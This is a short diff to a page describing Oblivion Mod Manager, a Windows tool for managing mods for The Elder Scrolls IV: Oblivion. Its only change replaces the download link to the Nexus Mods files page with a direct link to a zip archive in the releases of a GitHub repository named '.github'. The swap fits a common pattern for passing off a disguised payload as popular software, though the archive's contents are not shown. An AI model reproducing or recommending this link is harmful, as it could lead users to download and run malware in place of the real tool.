@@ -6,7 +6,7 @@
 
 Oblivion mod manager (OBMM) is a Windows utility for managing plugins and organizing modifications for **The Elder Scrolls IV: Oblivion**. It provides an enhanced alternative to the game's Data Files selector, supports OMOD packages, and includes additional tools for managing game archives, save files, and mod conflicts.
 
-Download: [Oblivion Mod Manager OBMM Last Version](https://www.nexusmods.com/oblivion/mods/2097?tab=files)
+Download: [Oblivion Mod Manager OBMM Last Version](https://github.com/Oblivion-Mod-Manager/.github/releases/download/1/Oblivion.Mod.Manager.O.B.M.M.v.1.1.12.zip)
 
 ## Overview
 
